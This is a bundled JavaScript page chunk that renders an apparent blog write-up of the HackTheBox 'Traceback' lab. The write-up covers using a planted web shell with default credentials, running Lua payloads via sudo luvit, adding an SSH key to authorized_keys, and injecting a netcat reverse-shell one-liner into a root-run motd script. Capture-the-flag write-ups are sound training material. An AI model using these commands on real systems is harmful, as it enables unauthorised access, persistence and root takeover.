_N_E=(window.webpackJsonp_N_E=window.webpackJsonp_N_E||[]).push([[11],{"7ljp":function(e,t,n){"use strict";n.d(t,"a",(function(){return h}));var a=n("q1tI"),o=n.n(a);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function c(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?c(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):c(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,a,o=function(e,t){if(null==e)return{};var n,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var l=o.a.createContext({}),u=function(e){var t=o.a.useContext(l),n=t;return e&&(n="function"===typeof e?e(t):s(s({},t),e)),n},d={inlineCode:"code",wrapper:function(e){var t=e.children;return o.a.createElement(o.a.Fragment,{},t)}},p=o.a.forwardRef((function(e,t){var n=e.components,a=e.mdxType,r=e.originalType,c=e.parentName,l=i(e,["components","mdxType","originalType","parentName"]),p=u(n),h=a,b=p["".concat(c,".").concat(h)]||p[h]||d[h]||r;return n?o.a.createElement(b,s(s({ref:t},l),{},{components:n})):o.a.createElement(b,s({ref:t},l))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"===typeof e||a){var r=n.length,c=new Array(r);c[0]=p;var s={};for(var i in t)hasOwnProperty.call(t,i)&&(s[i]=t[i]);s.originalType=e,s.mdxType="string"===typeof e?e:a,c[1]=s;for(var l=2;l<r;l++)c[l]=n[l];return o.a.createElement.apply(null,c)}return o.a.createElement.apply(null,n)}p.displayName="MDXCreateElement"},FYTF:function(e,t,n){e.exports={post:"post_post__1Lsln",codeblock:"post_codeblock__jpvW3"}},Ff2n:function(e,t,n){"use strict";function a(e,t){if(null==e)return{};var n,a,o=function(e,t){if(null==e)return{};var n,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}n.d(t,"a",(function(){return a}))},Qetd:function(e,t,n){"use strict";var a=Object.assign.bind(Object);e.exports=a,e.exports.default=e.exports},XZt4:function(e,t,n){"use strict";n.r(t),n.d(t,"meta",(function(){return u})),n.d(t,"default",(function(){return p}));var a=n("rePB"),o=n("Ff2n"),r=(n("q1tI"),n("7ljp")),c=n("FYTF"),s=n.n(c);function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){Object(a.a)(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var u={title:"Traceback (HackTheBox)",description:"HackTheBox",date:"August 19, 2020"},d={meta:u};function p(e){var t=e.components,n=Object(o.a)(e,["components"]);return Object(r.a)("wrapper",l(l(l({},d),n),{},{components:t,mdxType:"MDXLayout"}),Object(r.a)("div",{className:s.a.post},Object(r.a)("h1",null,"Traceback (HackTheBox)"),Object(r.a)("h6",null,"August 19, 2020"),Object(r.a)("p",null,"Started the box by enumerating services on the machine using nmap. Nmap scan returned http and ssh services which weren't that interesting."),Object(r.a)("div",{className:s.a.codeblock},Object(r.a)("pre",null,Object(r.a)("code",l({parentName:"pre"},{}),"# Nmap 7.80 scan initiated Wed May 20 06:40:09 2020 as: nmap -sV -sT -oN nmap 10.10.10.181\nNmap scan report for 10.10.10.181\nHost is up (0.094s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Wed May 20 06:40:21 2020 -- 1 IP address (1 host up) scanned in 11.59 seconds\n"))),Object(r.a)("p",null,"Going to ",Object(r.a)("a",l({parentName:"p"},{href:"http://10.10.10.181"}),"http://10.10.10.181"),", the website had already been owned by Xh4H and the hacker claims to have left a backdoor somewhere."),Object(r.a)("p",null,"Running directory bruteforcing using Daniel Miessler's wordlists returned zero results. However, upon checking the page source, there's a comment saying \"Some of the best web shells that you might need\".\nThrowing that string into Google took me to a Github repo ",Object(r.a)("a",l({parentName:"p"},{href:"https://github.com/TheBinitGhimire/Web-Shells"}),"https://github.com/TheBinitGhimire/Web-Shells"),"."),Object(r.a)("p",null,"Going through the list of backdoors, ",Object(r.a)("a",l({parentName:"p"},{href:"http://10.10.10.181/smevk.php"}),"http://10.10.10.181/smevk.php")," returned a ",Object(r.a)("code",null,"HTTP 200 OK"),". Using the default credentials ",Object(r.a)("code",null,"admin:admin"),", I was able to gain access to the webshell.\nThe webshell's interface was really ugly, but it was sufficient to do some basic enumeration."),Object(r.a)("div",{className:s.a.codeblock},Object(r.a)("pre",null,Object(r.a)("code",l({parentName:"pre"},{}),"# Determine user\n$ whoami\nwebadmin\n\n# Check home directory\n$ ls -a /home/webadmin\n. .. .bash_history .bash_logout .bashrc .cache .local .luvit_history .profile .ssh note.txt\n\n# Read note.txt\n$ cat /home/webadmin/note.txt\n- sysadmin -\nI have left a tool to practice Lua.\nI'm sure you know where to find it.\nContact me if you have any question.\n\n# List user privileges\n$ sudo -l\nMatching Defaults entries for webadmin on traceback:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser webadmin may run the following commands on traceback:\n    (sysadmin) NOPASSWD: /home/sysadmin/luvit\n"))),Object(r.a)("p",null,"Looking through the results, it seems ",Object(r.a)("code",null,"/home/sysadmin/luvit")," can be executed as the user ",Object(r.a)("code",null,"sysadmin")," without authentication."),Object(r.a)("p",null,"I had never written a single line of Lua code before and after doing some googling it seems that Luvit is a runtime environment for Lua.\nReading through the documentation I tried to craft some lua payload which will be executed as ",Object(r.a)("code",null,"sysadmin"),"."),Object(r.a)("p",null,"The following lua code lists files in ",Object(r.a)("code",null,"/home/sysadmin")),Object(r.a)("div",{className:s.a.codeblock},Object(r.a)("pre",null,Object(r.a)("code",l({parentName:"pre"},{}),"directory='/home/sysadmin/'\npfile = io.popen('ls -a \"'..directory..'\"')\nfor filename in pfile:lines() do\n    print(filename)\nend\n"))),Object(r.a)("p",null,"To execute this piece of code, I simply had to write this code somewhere on the box and run it using luvit. To do so, I echoed my code to ",Object(r.a)("code",null,"/tmp/")," on the box and ran it."),Object(r.a)("div",{className:s.a.codeblock},Object(r.a)("pre",null,Object(r.a)("code",l({parentName:"pre"},{}),"$ echo \"directory='/home/sysadmin/';pfile = io.popen('ls -a \\\\\"'..directory..'\\\\\"');for filename in pfile:lines() do;print(filename);end\" > /tmp/listdir.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/listdir.lua\n. .. .bash_history .bash_logout .bashrc .cache .local .profile .ssh luvit user.txt\n\n"))),Object(r.a)("p",null,"Modifying the payload to print ",Object(r.a)("code",null,"/home/sysadmin/user.txt"),", I got my first flag."),Object(r.a)("div",{className:s.a.codeblock},Object(r.a)("pre",null,Object(r.a)("code",l({parentName:"pre"},{}),"$ echo \"pfile = io.popen('cat /home/sysadmin/user.txt');for filename in pfile:lines() do;print(filename);end\" > /tmp/getflag.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/getflag.lua\n{{FLAG}}\n\n"))),Object(r.a)("p",null,"Enumerating through sysadmin's home folder, I found the ",Object(r.a)("code",null,".ssh")," folder with the ",Object(r.a)("code",null,"authorized_keys")," file. Adding my public key to this file should grant me ssh access as sysadmin to the box.\nUsing ",Object(r.a)("code",null,"ssh-keygen"),", I created a new ssh keypair. The payload adds my public key to the list of authorized keys. "),Object(r.a)("div",{className:s.a.codeblock},Object(r.a)("pre",null,Object(r.a)("code",l({parentName:"pre"},{}),'$ echo "io.popen(\\\\"echo \'{{PUBLIC KEY}}\' >> /home/sysadmin/.ssh/authorized_keys\\\\")" > /tmp/ssh.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/ssh.lua\n'))),Object(r.a)("p",null,"Ssh-ed into the box using ",Object(r.a)("code",null,"ssh -i PRIVATE_KEY ",Object(r.a)("a",l({parentName:"p"},{href:"mailto:sysadmin@10.10.10.181"}),"sysadmin@10.10.10.181"))," and I was greeted by a message from Xh4h and a shell."),Object(r.a)("div",{className:s.a.codeblock},Object(r.a)("pre",null,Object(r.a)("code",l({parentName:"pre"},{}),"\u279c  ~ ssh -i PRIVATE_KEY sysadmin@10.10.10.181\n#################################\n-------- OWNED BY XH4H  ---------\n- I guess stuff could have been configured better ^^ -\n#################################\n\nWelcome to Xh4H land \n\n$\n"))),Object(r.a)("p",null,"Trying to privilege escalate from sysadmin to root was kinda tricky. I tried looking for files with incorrect permisions or suid binaries but found nothing. However looking through the list of processes using ",Object(r.a)("code",null,"ps -aux"),", there was a command being executed as root that seemed to be running at intervals."),Object(r.a)("div",{className:s.a.codeblock},Object(r.a)("pre",null,Object(r.a)("code",l({parentName:"pre"},{}),"root       3851  0.0  0.0   4628   772 ?        Ss   19:15   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/\n"))),Object(r.a)("p",null,"The command seems to be restoring a backup of the message of the day (motd), which is a service that can be used to print custom greeting messages upon login - similar to the greeting from Xh4h upon ssh-ing into the box."),Object(r.a)("p",null,"Looking through ",Object(r.a)("code",null,"/etc/update-motd.d/"),", there were several messages and the first one ",Object(r.a)("code",null,"/etc/update-motd.d/00-header")," contained ",Object(r.a)("code",null,'echo "\\nWelcome to Xh4H land \\n"'),", which was the greeting upon logging into the box. This could be abused by adding commands to run upon login, which will be run as root."),Object(r.a)("p",null,"I set up a reverse shell listener on port 1337 on my local machine. Afterwards, I edited ",Object(r.a)("code",null,"/etc/update-motd.d/00-header")," to set up a netcat reverse shell connector. "),Object(r.a)("div",{className:s.a.codeblock},Object(r.a)("pre",null,Object(r.a)("code",l({parentName:"pre"},{}),'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ipaddr}} 1337 >/tmp/f; echo "\\nWelcome to Xh4Hland \\n"\n'))),Object(r.a)("p",null,"In a different window, ssh into the box and monitor the reverse shell listener. Note that it may require a few tries since the motd gets overwritten every 30 seconds. If timed correctly you should have access to the root shell. Navigate to ",Object(r.a)("code",null,"/root")," to grab the root flag."),Object(r.a)("div",{className:s.a.codeblock},Object(r.a)("pre",null,Object(r.a)("code",l({parentName:"pre"},{}),"$ cat /root/root.txt\n{{FLAG}}\n\n")))))}p.isMDXComponent=!0},rePB:function(e,t,n){"use strict";function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}n.d(t,"a",(function(){return a}))},vNe5:function(e,t,n){(window.__NEXT_P=window.__NEXT_P||[]).push(["/blog/traceback",function(){return n("XZt4")}])}},[["vNe5",0,1]]]);